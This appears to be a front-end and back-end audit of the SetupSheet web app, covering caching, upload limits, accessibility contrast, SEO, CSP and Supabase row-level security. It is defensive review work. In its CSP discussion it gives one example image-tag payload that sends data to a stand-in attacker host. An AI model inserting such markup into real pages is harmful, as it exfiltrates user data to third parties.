# SetupSheet — Website-Wide Front-End & Back-End Audit

**Target:** `https://setupsheet.app` (production) + the deployed source tree in this repository
**Date:** 2026-09-21
**Auditor vantage point:** external HTTP probes of production, a locally built production server (`next start`) from the same commit, and full source/SQL review. No server, Vercel, Supabase-dashboard, Search Console, or analytics access.
**Stack (confirmed):** Next.js 16.3.3 (App Router, Turbopack build) · React 19.2 · TypeScript 5.9 · Tailwind CSS v4 · Radix/shadcn primitives · Supabase (Postgres + RLS + Storage + GoTrue) · deployed on Vercel · no third-party scripts of any kind.

---

## 1. Executive Summary

### Overall health score: **71 / 100**

A genuinely well-engineered early-stage product with an unusually disciplined security and data layer, held back by three things: **one broken core feature (file uploads > 1 MB)**, **an uncacheable, fully dynamic rendering model that pushes every request into a serverless render**, and **accessibility/SEO polish gaps that are cheap to fix**. Nothing here is structural rot — this is a "fix six specific things" audit, not a rewrite.

| Pillar | Score | One-line justification |
|---|---|---|
| Security & data protection | **88** | Nonce CSP, HSTS preload, RLS + column-level grants on insert *and* update, trigger-based rate limits, escaped JSON-LD, no third-party scripts, no `innerHTML`, safe OAuth redirect |
| Backend/data architecture | **78** | Explicit projections, keyset pagination, tag-scoped cache invalidation; but no cacheable HTML, no circuit breaker, failures silently cached as empty |
| Code quality & maintainability | **84** | Lint/typecheck clean, 146 unit tests, sensible module boundaries; 5.2k LOC of client components and duplicated helpers are the debt |
| Technical SEO | **74** | Correct canonicals, sitemap, Article/Breadcrumb JSON-LD, robots; but soft-404s, no indexable category pages, no `AggregateRating` |
| Performance / Core Web Vitals | **60** | 313–326 KiB gzip JS per public route, 44–56 % of HTML is a duplicate RSC payload, every response is `no-store`, DB failure path is 7 s |
| Accessibility (WCAG 2.2 AA) | **62** | Good fundamentals (labels, `role="alert"`, focus-visible, `aria-busy`); real contrast failures, 1.56:1 light-theme focus ring, no skip link |
| Observability & operability | **45** | Zero RUM/CWV field data, no error tracking, no alerting, no CSP reporting — the two most severe findings here are invisible to the team |

### Top critical issues (mix of FE + BE)

| # | Issue | FE/BE | Evidence |
|---|---|---|---|
| 1 | **Any setup/telemetry upload > 1 MB fails with an HTTP 500.** The UI advertises 5 MB (setup) and 10 MB (telemetry); Next's default Server Action body limit is 1 MB and nothing overrides it. | BE (+FE copy) | Reproduced against a production build: 2 MB and 6 MB multipart Server Action POSTs returned `500` with digest `…@E394`; server log: `Error: Body exceeded 1 MB limit. statusCode: 413`. `src/lib/storage.ts:2-3` vs. no `serverActions.bodySizeLimit` in `next.config.ts` |
| 2 | **No HTML route is cacheable.** Every page response is `Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate` with `X-Vercel-Cache: MISS` — verified on `/`, `/setups`, `/setups/[id]`. 18 of the 22 routes are dynamic (`ƒ`) because the root layout calls `cookies()`/`headers()`. Every hit = full SSR + DB queries. | BE/FE | Live headers on 5 URLs; `next build` route table; `src/app/layout.tsx:86-99` |
| 3 | **Soft 404s with an empty body.** `/setups/not-a-uuid`, `/setups/<missing-uuid>`, `/profile/not-a-uuid` all return **HTTP 200**. The response HTML contains **zero `<h1>` elements and no visible "not found" copy** — the message exists only in the RSC payload, so users without JS see a blank page between the header and footer. | FE/BE | Live `200 OK` for `/setups/not-a-uuid`; local render byte-inspection of the missing-setup page |
| 4 | **WCAG AA contrast failures in the default (dark) theme**, including on *error* text: `--racing-red` = 3.62–4.14:1 and `--destructive` = 3.05–3.49:1 against card/muted/background (needs 4.5:1 for normal text). The light-theme focus ring composites to **1.56:1** (needs 3:1, SC 1.4.11). | FE | Computed from `src/app/globals.css` OKLCH tokens (OKLCH→linear-sRGB→WCAG luminance) |
| 5 | **Client payload budget is 2–3× a healthy content site.** `/` ships 17 JS files = 313.4 KiB gzip; `/setups` ships 19 = 325.8 KiB gzip; 31 `"use client"` components totalling 5,188 LOC; on `/setups` up to 500 hydrated setup cards are serialized from the server. | FE | Per-route gzip sums of the exact `<script src>` set in each rendered document |
| 6 | **Data-layer failure has no circuit breaker and its degradation gets cached.** `AbortSignal.timeout(5000)` + `unwrapList()` returning `[]` means a DB blip renders empty pages at ~7 s TTFB — and `unstable_cache` then stores that empty result for `revalidate: 60`. | BE | Local measurements with an unreachable Supabase: `/setups` 7.10 s, `/setups/[id]` 7.06 s, `/requests` 7.05 s; `src/lib/supabase/fetch.ts`, `query-helpers.ts`, `setups.ts:120` |
| 7 | **Zero observability.** No `@vercel/analytics`/Speed Insights/web-vitals beacon, no Sentry-type error tracking, no CSP `report-to`, no uptime alerting. There is no way to know #1 or #6 happened, and no field LCP/INP/CLS data to manage Core Web Vitals with. | Both | `package.json` dependency list; `src/lib/logger.ts` (stdout JSON only); absence of any `/api/report` receiver |

### Highest-impact opportunities

1. **Make anonymous HTML cacheable** (partial prerendering / static shell + client-side auth island, or move the notification fetch into a `<Suspense>` boundary behind a cookie-gated component). This is the single change that most improves TTFB, TTFB-variance, INP-adjacent hydration cost, Vercel function spend, and DB load simultaneously.
2. **Unbreak uploads** (raise `serverActions.bodySizeLimit` *and* switch to Supabase signed direct-to-Storage uploads so bytes never transit the serverless function — Vercel also caps function request bodies at ~4.5 MB, so the current 5 MB/10 MB limits can never be honoured through the function).
3. **Build indexable category pages** (`/setups/iracing`, `/setups/acc/monza`, `/setups/f1-25`). Every game/track/condition combination currently canonicalizes to `/setups`, so the site has exactly one rankable browse URL despite owning the content for hundreds of high-intent queries. This is the largest organic-growth lever available.
4. **Add real-user monitoring + error tracking** (one dependency, ~30 lines) — everything else gets easier to prioritise and verify afterwards.
5. **One accessibility pass on colour tokens + a skip link** — hours of work, removes legal/compliance exposure (EAA/ADA-relevant for a public site) and helps every low-vision user.

### Effort vs. impact

| | Low effort | High effort |
|---|---|---|
| **High impact** | Upload fix + direct-to-Storage · contrast token tuning · skip link · `AggregateRating` JSON-LD · remove dead `public/*.svg` · real 404 from `src/proxy.ts` | Cacheable HTML/PPR · indexable category pages · RUM + error tracking · RSC payload diet · direct-to-Storage upload pipeline |
| **Lower impact** | `alt=""` on decorative avatars · `theme-color`/`apple-touch-icon` · global-error branding · `www`→apex 308 · print stylesheet for setup values | Circuit breaker + degraded-mode UI · sharding the browse index server-side |

---

## 2. Front-End Audit

### 2.1 HTML & semantics

**Observed (local production build, same commit as production):**

| Page | HTML bytes | Inline `<script>` (RSC payload) | Share | Landmarks | Headings |
|---|---|---|---|---|---|
| `/` | 60,609 | 33,627 B | **55.5 %** | header 1, nav 2, main 1, footer 1 | h1 → h2 → h3 h3 h3 → h2 → h2 |
| `/setups` | 50,487 | 22,166 B | **43.9 %** | header 1, nav 2, main 1, footer 1 | h1 → h2 |
| `/setups/<missing>` | 36,624 | 22,245 B | 60.7 % | header 1, nav 2, main 1, footer 1 | **none** |

- **Landmark structure is correct**, `lang="en"` is present, `<main>` wraps page content once, and each route has a single `h1` (except the soft-404 case, below). Breadcrumbs on setup/profile pages use `<nav aria-label="Breadcrumb">` with `aria-current="page"`.
- **Heading duplication for assistive tech:** visually hidden `<h2 class="sr-only">` headings ("Setup results", "Contributor rankings", "Why racers use SetupSheet") are used to label sections — correct technique, no notes.
- **Soft-404 document is semantically empty:** `/setups/<missing-uuid>` returns `<title>Setup not found</title>` + `<meta name="robots" content="noindex, nofollow">` (both good) but the *body* contains no `<h1>` and no not-found card markup — the card exists only inside the `self.__next_f.push(...)` flight payload and appears after hydration. **A user with JS disabled, a slow connection, or a crawler that doesn't render sees the header and footer with nothing between them.** The same is true for `/profile/<missing-uuid>`.
- **RSC payload doubles the document.** 44–56 % of every HTML response is a second serialization of data that is already in the markup (e.g. every setup card's car, track, lap time, tags, ratings, author). It is required for client-side navigation, but it means the first byte count and the parse cost are ~2× what they need to be, and it grows linearly with the number of cards rendered.
- **Dead starter assets are still deployed:** `public/file.svg`, `globe.svg`, `next.svg`, `vercel.svg`, `window.svg` (5 files, ~3.3 KB) are unreferenced Next.js scaffold leftovers.
- No `theme-color` meta, no `manifest.webmanifest`, no `apple-touch-icon` — an iOS "Add to Home Screen" renders a generic icon/screenshot.

### 2.2 CSS & styling

**Observed:** a single stylesheet per page (`/_next/static/chunks/*.css`, **12.1 KiB gzip**) — Tailwind v4 output is well within budget and there is no CSS bloat, no `!important` sprawl in application code, and no unused framework (no Bootstrap/MUI-class baggage).

- **Organization is good:** one `globals.css` with a documented token system (`:root`/`.dark`/`.light` OKLCH variables), a single `@theme inline` mapping layer, `@layer base` for element defaults and `@layer utilities` for two custom utilities. Specificity stays in Tailwind's single-class range; the only legacy pattern is `@apply` inside `@layer base`.
- **Dark mode:** the site ships a dark-first brand theme with a real light theme (independently tuned lightness values, not an inversion — genuinely thoughtful). **System preference is deliberately ignored** (`<ThemeProvider defaultTheme="dark" enableSystem={false}>`): a visitor on a light-mode OS gets the dark theme unless they find the toggle. That is a defensible brand decision but costs comprehension for users on bright screens; `enableSystem` with a dark default would be strictly better.
- **No print stylesheet.** For a site whose core artifact is a *tuning sheet* (ordered damper/ARB/tyre values), printing `/setups/[id]` currently prints the dark theme — near-black background across a full page of ink — and the "Download / export" affordances. A 20-line `@media print` block (white ground, hide nav/buttons, show setup values as a table) is a high-value, low-effort win for the sim-racing workflow.
- **`content-visibility: auto` on every setup card** (`src/components/setup-card.tsx:321`, `.content-auto { content-visibility: auto; contain-intrinsic-size: 0 520px }`) is a legitimate scroll-perf optimisation, but the fixed `520px` intrinsic height is a **CLS/scroll-anchoring risk** if real card heights differ (they vary with tag count, comment state, and rating widget). This could not be verified without a browser (see §6 limitations) — it is the first thing to measure once Lighthouse/field data is available.

### 2.3 JavaScript

| Measurement (production build) | `/` | `/setups` |
|---|---|---|
| Script requests | 17 | 19 |
| Raw JS | 1,047 KiB | 1,084 KiB |
| **JS transferred (gzip)** | **313.4 KiB** | **325.8 KiB** |
| Inline RSC payload | 33.6 KiB | 21.6 KiB |
| CSS (gzip) | 12.1 KiB | 12.1 KiB |

- Whole build: 35–36 chunks, **391.5 KiB gzip total**, largest single chunk 71.5 KiB gzip (229 KiB raw). The repo's own `scripts/check-performance-budget.mjs` passes (403.6 KiB) — but that budget sums *all* chunks in the build, not what a page actually downloads, so it under-reports the per-visit cost it is meant to guard.
- **Hydration surface:** 31 `"use client"` components / 5,188 LOC, including `setup-card.tsx` (658 LOC) — rendered once per card, up to 500 times per browse view. Each card carries its own comments, version-history, rating, and install-guide sub-clients (lazy-mounted, which is the right call, but the top-level card itself still hydrates per row).
- **Third-party scripts: none.** This is a real strength — no GTM, no analytics vendor, no chat widget, no fonts. The only external origins in a rendered page are Discord's CDN for avatars (`img`) and YouTube `youtube-nocookie.com` in `frame-src` (only used when a user opens a hotlap video).
- **Progressive enhancement:** navigation works without JS (real `<a href>`/`<Link>`), but **browse filtering, sorting, compare, download and every write action are JS-only**, and the soft-404 body (issue #3) is JS-only content. There is no `<noscript>` fallback anywhere.
- **Client-side error handling is decent:** `src/app/error.tsx` and `global-error.tsx` both exist, log structured errors, and offer `reset()`. `global-error.tsx` is styled with hard-coded inline colours (`#0a0d0b`, `#2ac45c`) that do not match the brand tokens (racing coral primary, `oklch(0.62 0.19 25)`) — the one page that should feel most trustworthy looks like a different product.

### 2.4 Performance & Core Web Vitals

> **Limitation up front:** no Lighthouse/PageSpeed/CrUX numbers could be produced in this environment (no Chromium binary obtainable, PSI API quota exhausted without a key, third-party Lighthouse proxies unavailable). Everything below is *directly measured* server-side behaviour or *structurally inferred*, and each item says which. Field data for this origin is in any case unlikely to exist yet (20 setups, a handful of contributors) — so this section is about fixing the *causes* before traffic arrives.

**Measured, production:**

- **TTFB / cacheability:** every HTML route returns `Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate` + `X-Vercel-Cache: MISS`. There is no edge or CDN reuse of HTML at all — the entire rendering cost is paid per request, including for anonymous visitors who will never see personalised content.
- **The layout blocks first byte on personalisation:** `src/app/layout.tsx` awaits `getCurrentUser()` and then, for logged-in users, `Promise.all([getNotifications(user.id, 10), getUnreadNotificationCount(user.id)])`. `getNotifications` adds two more queries (actors, setups) → **~5 sequential Supabase round trips before any HTML is flushed**, on *every* route, for exactly the users who matter most. For anonymous visitors this is correctly skipped (`hasSupabaseAuthCookie` early-out) — a good optimisation that the authenticated path doesn't share.
- **Data-layer timeout behaviour:** with an unreachable database, data pages take **7.05–7.32 s** and then render an empty result (`/setups` 7.10 s, `/setups/<uuid>` 7.06 s, `/requests` 7.05 s, `<uuid>/opengraph-image` 7.32 s) despite `SUPABASE_FETCH_TIMEOUT_MS = 5000`. Google's "good" TTFB threshold is 0.8 s; a 7 s response is a failed LCP by construction.
- **Static asset caching is correct:** `/_next/static/chunks/*.js` → `Cache-Control: public, max-age=31536000, immutable` (verified live and locally).
- **Compression:** `Content-Encoding: gzip` observed live and locally. Brotli could not be verified from this environment (no way to send `Accept-Encoding: br` through the proxies available) — worth confirming, since Vercel serves `br` to browsers and the JS payload is exactly the case where the ~15–20 % extra saving matters.

**Inferred / structural risks:**

- **LCP:** the hero is text + CSS gradients, so LCP should be text-based and fast *on a cache-miss-free first paint*; the risk is not image weight (there are no images above the fold) but **313–326 KiB of JS + 44–56 % payload duplication competing for bandwidth on mobile**, plus uncacheable HTML meaning repeat visits never benefit from a warm edge.
- **INP:** each browse view can hydrate hundreds of interactive cards (each with checkbox/rating/comment controls) and `setups-browser.tsx` then re-filters the entire loaded array in memory on every keystroke (`useDeferredValue` is used, which mitigates but does not remove long tasks). Up to 500 rows are shipped to the client by design (`SETUPS_BROWSE_LIMIT = 500`).
- **CLS:** `contain-intrinsic-size: 0 520px` on every card is the main candidate (above); fonts are a non-issue because the site loads **no webfont at all** (see §2.8), so there is no FOUT/FOIT shift.
- **Image optimisation: not applicable / not used.** There are **zero `<img>` tags from `next/image`** and no `images.remotePatterns` in `next.config.ts`, so avatars are plain Radix `AvatarImage` `<img>` elements pointing at `cdn.discordapp.com` with `loading="lazy"`, `decoding="async"`, `referrerPolicy="no-referrer"`, and a fixed-size parent (`size-5`). Layout shift is contained, but there is no responsive `srcset`, no WebP/AVIF conversion, no disk cache, and every card issues a request to a **third-party origin whose latency and caching policy are outside the team's control** (Discord serves avatar URLs with long-lived `?size=` variants and can be slow). Since avatars are the only raster images on the site, consider proxying/rewriting them through `next/image` with `remotePatterns` for the Discord host, or caching them in Supabase Storage at sign-in.
- **Fonts:** `--font-inter` / `--font-jetbrains-mono` are declared with real font names in `globals.css`, but **no webfont is ever loaded** (no `next/font`, no `@font-face`, no Google Fonts `<link>`). Every visitor therefore renders in the OS default stack (`-apple-system`/`Segoe UI`/`Roboto`) — great for performance, but the intended typography never ships, and the `README`/`proxy.ts` comments still claim "next/font self-hosted fonts". Either load Inter via `next/font/local` (self-hosted, `display: swap`, subset) or drop the font names from the tokens so the design intent matches reality.

### 2.5 Accessibility (WCAG 2.2 AA)

**Strong baseline (verified in source):** every form control is programmatically labelled (`<Label htmlFor>` + matching `id` — `report-content-form`, `setup-request-form`, `upload-form`, `setups-browser`); error messages use `role="alert"`; the results grid uses `aria-busy` during deferred search; disclosure widgets use `aria-expanded`; the mobile drawer is a Radix `Sheet` with a `SheetTitle` and an `sr-only` "Close" label; the compare diff announces changed rows via `sr-only` text; `aria-current="page"` is used in breadcrumbs; a global `:focus-visible` outline and a `prefers-reduced-motion` block are present; touch targets are Radix-sized (~36–44 px, comfortably above the 24 px SC 2.5.8 minimum); Radix primitives supply the ARIA/keyboard behaviour for menus, selects, dialogs and tabs.

**Confirmed failures and gaps (computed from `src/app/globals.css`):**

| Element | Dark theme ratio | Light theme ratio | Requirement | Verdict |
|---|---|---|---|---|
| `--racing-red` error/alert text on card / muted / background | **3.90 / 3.62 / 4.14** | 5.67 / 4.90 / 5.36 | 4.5 (normal text) | **FAIL in dark** — used for form errors, comment errors, load errors (`role="alert"`) |
| `--destructive` text on card / background / muted | **3.29 / 3.49 / 3.05** | 5.67 / 5.36 / 4.90 | 4.5 | **FAIL in dark** |
| `--primary`/`--racing-coral` text on muted | 4.34 | 4.45 | 4.5 | Borderline fail (e.g. compare-mode banner text) |
| Focus ring (`--ring`, primary @55 % α) on card / background | 3.02 / 3.18 | — | 3.0 (SC 1.4.11) | **Passes by 0.02** — fragile |
| Focus ring in light theme (`--ring`, primary @45 % α) | — | **1.56** | 3.0 | **FAIL** — the keyboard focus indicator is effectively invisible in light mode |
| `--muted-foreground` on all three surfaces | 4.76–5.44 | 6.16–7.12 | 4.5 | Pass |
| Card/divider border (white @10 %) | 2.76 | — | n/a (decorative) | Note: any control relying on it would fail 1.4.11 |
| Input border (white @14 %) | 3.63 | — | 3.0 | Pass |
| Primary button label pairs | 4.93 / 5.00 | 4.93 / 5.00 | 4.5 | Pass |

- **No skip-to-content link.** The fixed header contains a logo, 5–8 nav links, a search form, theme toggle, notification bell and account menu; keyboard users must tab through all of it on every page. This is SC 2.4.1 (Bypass Blocks, Level A). The `sr-only` heading technique used elsewhere shows the team already cares about this class of issue — it's a ~6-line fix.
- **Screen-reader duplication:** `<AvatarImage src={setup.authorAvatarUrl} alt={setup.author} />` sits immediately before the visible author name inside the same link (`setup-card.tsx:389-396`), so the name is announced twice per card. The avatar is decorative in that context → `alt=""`.
- **Focus not obscured (SC 2.4.11, new in 2.2):** the header is `sticky top-0 z-40`; whether focused elements scroll beneath it (e.g. anchor jumps, in-page tabbing to a card header) could not be verified without a browser — worth a manual keyboard pass.
- **Extremely small text:** the `/` kbd hint and `AvatarFallback` initials use `text-[10px]`/`text-[9px]` — legible-ish but below any comfortable minimum, and 10 px muted text is hard for low-vision users.
- **No `aria-live` announcement for the "Load older setups" result** (the button label changes, which is acceptable) and no announcement when compare-mode selection changes; minor.

### 2.6 Responsive & mobile

- Layout uses mobile-first Tailwind breakpoints with a real mobile drawer and no fixed-width traps; `sm:`/`md:`/`lg:`/`xl:` variants are used consistently and the card grid steps 1 → 2 → 3 columns.
- **Search is unreachable by tap between 768 px and 1279 px.** The desktop search form is `hidden … xl:block` and the mobile copy lives inside the `md:hidden` drawer, so on a tablet/small laptop (and a phone in landscape) there is **no visible search affordance at all** — only the undiscoverable `/` keyboard shortcut. This is the most concrete UX defect in the header and it sits on the primary discovery path.
- **Viewport:** Next injects `<meta name="viewport" content="width=device-width, initial-scale=1">` (verified in the built HTML) — no `maximum-scale`/`user-scalable=no` trap (good for SC 1.4.4).
- Mobile performance differences were not measured (no device/browser available); the JS weight above applies equally to mobile, where it hurts more.

### 2.7 Client-side security

**Verified strengths:**

- **CSP is genuinely strong and per-request nonce-based:** `default-src 'self'; script-src 'self' 'nonce-<uuid>'; style-src 'self' 'unsafe-inline'; img-src 'self' https:; font-src 'self'; frame-src 'self' https://www.youtube-nocookie.com; connect-src 'self' https://*.supabase.co wss://*.supabase.co; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; object-src 'none'`. Observed live with a different nonce on every response; 21–28 nonce attributes per document.
- **No third-party JavaScript at all**, so there is no supply-chain script risk and nothing to exfiltrate through.
- **No `innerHTML` / `eval` in application code.** The single `dangerouslySetInnerHTML` is the JSON-LD block, and `serializeJsonLd()` escapes `<`, `>` and `&` — the pattern that defeats `</script>` breakout. There is a unit test for it (`src/lib/seo.test.ts:20`).
- **No secrets in the client bundle:** only `NEXT_PUBLIC_SUPABASE_URL` + anon key (correct by design); no service-role key anywhere in `src/`.
- **OAuth handling is hardened:** `sanitizeRedirectUrl()` rejects protocol-relative and backslash targets, and the callback deliberately ignores `x-forwarded-host` to avoid an open redirect (`src/app/auth/callback/route.ts`, covered by 5 tests).
- Avatars are fetched with `referrerPolicy="no-referrer"` (no referrer leak to Discord).

**Residual client-side risks:**

- **`img-src 'self' https:` is very broad.** Any XSS that could inject markup (or any user-supplied URL that reaches an `img`) becomes an outbound data-leak channel to an arbitrary host (`<img src="https://attacker/?d=…">`) and a free beacon/tracking vector. Tightening to `'self' https://cdn.discordapp.com <supabase-storage-host>` (plus any avatar hosts actually used) costs nothing legitimate.
- **No `report-to`/`report-uri`** on the CSP, so policy violations and any future XSS attempt are silent.
- **`style-src 'unsafe-inline'`** is a documented, justified compromise (Radix sets `style=""` attributes for positioning) — noted, not a defect.
- **No `Cross-Origin-Resource-Policy`/`Trusted Types`.** Low priority given the rest of the posture.
- `frame-ancestors 'self'` and `X-Frame-Options: DENY` contradict each other (modern browsers honour `frame-ancestors` and would permit same-origin framing; the app never frames itself). Cosmetic, but pick one: `frame-ancestors 'none'` matches the stated intent.
- **Uploads over 1 MB fail**, and the failure currently surfaces as a generic 500 without a user-actionable message — which also means the "drag a real ACC `.json`" affordance silently breaks for larger telemetry files (see §3.2).

### 2.8 UX & conversion

- **Clear, honest positioning:** "100% Free · No account required to browse", benefit-led feature cards, and a low-friction CTA pair (Browse / Upload). Trust signals are present: privacy, terms and community guidelines in the footer, `no-referrer` avatars, verified-lap badges.
- **Friction on the primary conversion path (upload):** beyond the 1 MB failure, the form is a 797-line client component with drag-and-drop, accordion proof/telemetry sections, star ratings for two axes, tag picker and a localStorage draft. Good craft (the draft survives a refresh, keyed per user), but the **error experience for the most likely failure — "file too large" — is a raw 500**.
- **Confusing affordance:** "Download Setup" appears on the *browse cards* (0 downloads shown for most) with a separate "How to install this setup" / "Version history" / "Comments" trio repeated under every card — three disclosure rows per card makes the grid visually noisy and pushes the actual differentiator (pace/predictability) below the fold on mobile.
- **Loading states:** skeleton `loading.tsx` files exist for `/setups`, `/upload`, `/leaderboard`, `/profile`, `/profile/[userId]`, `/requests`, `/setups/compare` — but **not for `/setups/[id]`**, the page a search visitor lands on directly. A cold DB means the detail page shows nothing until the query returns (measured: 7 s in the failure case).
- **Notification bell** re-syncs on navigation with no realtime updates (documented in the README) — acceptable, but the unread state can be stale for a long-lived tab.
- **Empty states are well written** ("No setups match your filters — try clearing a filter or check back soon"), with a recovery action.
- **No analytics of any kind**, so none of the above is measured: no funnel, no drop-off, no CTA performance. For a pre-launch product this is the cheapest instrumentation win available.

---

## 3. Back-End Audit (observable + inferred)

### 3.1 Server & response characteristics

| Probe | Result |
|---|---|
| `GET http://setupsheet.app/` | `308 Permanent Redirect` → `https://setupsheet.app/` |
| `GET https://www.setupsheet.app/` | `307 Temporary Redirect` → apex (correct consolidation; `308` would be marginally better signalling) |
| `GET /`, `/setups`, `/setups/<uuid>` | `200`, `Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate`, `X-Vercel-Cache: MISS` |
| `GET /setups/not-a-uuid` | **`200`** (soft 404) |
| `GET /totally-bogus-page` | `404` (framework 404) |
| `GET /setups/not-a-uuid/opengraph-image` | `404`, 0 bytes, 4.5 ms — the proxy guard added in `src/proxy.ts:70-73` works exactly as intended |
| `GET /opengraph-image` | `200`, `image/png`, 65,014 B, `Cache-Control: public, max-age=0, s-maxage=86400, stale-while-revalidate=604800`, `X-Vercel-Cache: HIT`, **`Age: 842720` (9.75 days)**, ETag present |
| `GET /robots.txt`, `/sitemap.xml` | `200`, correct content (28 URLs: 7 static + 20 setups + 1 profile) |
| `Content-Encoding` | `gzip` observed (brotli unverified from this vantage point) |
| `Server` | `Vercel`; `X-Vercel-Id`, `X-Matched-Path` present; `X-Powered-By` correctly suppressed |
| Local production server TTFB, DB unreachable | `/` 22 ms (failure result was already cached), `/setups` 7,101 ms, `/requests` 7,049 ms, `/setups/<uuid>` 7,058 ms |

- **Redirect chain is clean** (single hop, no loops), no trailing-slash duplication observed.
- **Anomaly worth a ticket:** live HTML responses carry a malformed hint header — `Link: ; rel=preload; as="style"; nonce="…"` — with an **empty URI**. It is emitted by the framework (Turbopack/Next 16 on Vercel), does nothing useful, and should be confirmed/removed with a newer Next patch or reported upstream. Also note `Vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch` is applied even to image responses, fragmenting the edge cache key for static PNGs.
- **OG images can be ~8+ days stale** at the edge (`s-maxage=86400` + `stale-while-revalidate=604800`), and one was observed at `Age: 9.75 days`. The per-setup OG URL is versioned (`?v=<hash>`) when a setup is edited, which mitigates the *content* case — but an unedited-but-deleted setup keeps serving a card image, and a first-time social unfurl of a brand-new setup can be served a fallback/older render.
- **Runtime dependency on Google Fonts for OG images:** `src/lib/og-fonts.ts` fetches `fonts.googleapis.com` CSS (with an IE user-agent to get satori-readable `.woff`) then the font binary, with a 4 s timeout and a module-level promise cache. Failures degrade gracefully to satori's default font (verified: logs show `loadGoogleFont: failed to load Inter 400/500/600/700` here, and images still rendered) — but that means **a Google Fonts hiccup silently changes the typography of every social card**, and each cold serverless instance pays two extra network round-trips on the OG path. Self-hosting the two OG fonts in the repo removes the dependency entirely.

### 3.2 API design & efficiency

**There is no REST/GraphQL API surface — by design.** The only route handler is `/auth/callback`. All writes are React Server Actions; all reads happen in Server Components/actions directly against Supabase PostgREST with the anon key under RLS. That eliminates the usual BOLA/IDOR class of API bugs, but it moves the efficiency question to "what happens per render" and "what can an anonymous caller trigger".

**Good patterns verified in the data layer:**
- **Explicit column projections** everywhere (`SETUP_COLUMNS` constant with a comment explaining why `*` is banned) — no schema-leak-by-default.
- **Keyset (cursor) pagination** for browse and profile grids (`setups_created_at_id_idx`, `setups_user_created_at_id_idx`) rather than `OFFSET`.
- **Tag-scoped cache invalidation** with real thought behind it: `setupsContent` / `setupsCounters` / `setupsSitemap` / `publicProfiles`, so the most frequent write (an upvote) does not invalidate the sitemap walk (`src/lib/cache-tags.ts`).
- **Per-request client memoisation** (`cache()` around `createClient()` and `getCurrentUser`).
- **Trigram GIN indexes** for cross-field search (`setups_game_trgm_idx`, `car`, `track`, `description`) and a dedicated `setup_search` view.

**Efficiency problems:**

1. **The browse index ships the whole table slice to the client.** `GET /setups` fetches up to `SETUPS_BROWSE_LIMIT = 500` fully-hydrated rows server-side, serialises them into HTML *and* the RSC payload, and then filters/sorts them in the browser. At 20 setups this is fine; at 500 it is a multi-hundred-KB response and a long hydration task, and the code itself documents the consequence (`isCapped` banner). Search and filtering also stop covering older setups once the cap is hit, which is a correctness cliff, not just a performance one. "Load older" pages `SETUP_CARD_PAGE_SIZE * 4` more rows each click, re-serialised through the RSC boundary.
2. **Anonymous write amplification with no throttle.** `downloadSetup` and `recordSetupExport` are deliberately public (`src/lib/actions/setups.ts`) and each one performs a `SELECT` + `increment_downloads` (a `security definer` `UPDATE`) against Postgres. The RPC has the default `PUBLIC EXECUTE` grant, so a bot can inflate any setup's counter and force write traffic at will — the only rate limits in the schema are per-user triggers that explicitly no-op when `auth.uid()` is null. Adding an IP/session-based limiter in `src/proxy.ts` (or debouncing per session in the UI) would close it cheaply. Note the correct counter-measure is *not* to make downloads require login (that would hurt conversion).
3. **No response-body ceiling on Server Actions.** See §3.5 — this is the 1 MB upload bug.
4. **`getNotifications()` performs a flat query plus two `IN (...)` follow-ups** for up to 10 notifications, plus a separate `count` query for the badge = **4 round trips added to every authenticated page render**, on top of `auth.getUser()`.
5. **Error responses are not distinguishable by the client** in one important case: a 413 from the framework never reaches the action, so the UI cannot show "file too large" — it simply sees a failed action.

### 3.3 Data & content delivery

- **All public reads go through `unstable_cache` with `revalidate: 60`** (browse, featured, count, sitemap 3600, related, SEO row) using a **cookie-free anon client** (`createPublicClient()`) — the correct way to keep per-viewer state out of a shared cache, and worth calling out as a strength.
- **But the HTML that wraps that data is uncacheable** (`private, no-store`), so the cache only saves the DB round trip, not the render, the serialization, or the transfer. The architecture is "cached data behind an uncacheable document".
- **Deletion/dynamic-rendering signals:** all 18 HTML routes are `ƒ (dynamic)`; only `icon.svg`, `/opengraph-image`, `/robots.txt`, `/sitemap.xml` are static. There is no static shell, no ISR, no PPR.
- **Content delivery:** Vercel's edge serves the static assets and the cached PNGs (verified `HIT`), but never HTML. There is no separate CDN in front (a Vercel front, effectively), and no evidence of edge middleware doing more than nonce generation + session refresh + the OG guard.
- **Storage:** Supabase Storage bucket `setup-files` with a public-read policy, owner-folder write policy enforced by `isOwnedStoragePath()` (exactly two path segments, first segment = owner id, no traversal, no control chars) — a well-designed object path model. Setup files are validated by extension allow-list (`ALLOWED_SETUP_FILE_EXTENSIONS`) *and* magic-byte signature (`validateFileSignature`). A GC function (`orphaned_setup_files`, service-role only) and bucket limits exist for abandoned uploads.
- **Stale-data signal to watch:** because failures are swallowed (`unwrapList → []`) *inside* the `unstable_cache` scope, a transient DB error caches an **empty** result for 60 s. During that window every visitor sees "No setups yet" (or a 0-count homepage) with no indication anything is wrong. Caching a failure state is worse than not caching it.

### 3.4 Security posture

**Verified live response headers (all routes):**

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-<per-request-uuid>'; … (see §2.7)
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Cross-Origin-Opener-Policy: same-origin-allow-popups
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
X-Permitted-Cross-Domain-Policies: none
X-DNS-Prefetch-Control: on
X-Powered-By: (suppressed)
Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate   ← HTML
```

**Database authorisation (reviewed across 29 migrations) — the strongest part of this product:**

- **Row Level Security enabled on every user-content table** (profiles, setups, upvotes, ratings, follows, notifications, versions, requests, favorites, comments, reports, deletion requests) with owner-scoped write policies.
- **Column-level grants on top of RLS**, for both `UPDATE` *and* `INSERT`: authenticated users cannot set counters, timestamps, or fulfilment fields even via a direct PostgREST call (`0009_column_level_grants.sql`, `0021_insert_grants_and_rate_limits.sql`). This closes the classic "RLS restricts rows, not columns" hole that most Supabase apps leave open.
- **Abuse rate limits enforced in the database**, not just the UI, with `pg_advisory_xact_lock` to close the concurrent-insert race: 20 uploads/hour, 60 comments/hour, 10 requests/day — and they apply to direct PostgREST callers too, not only Server Actions.
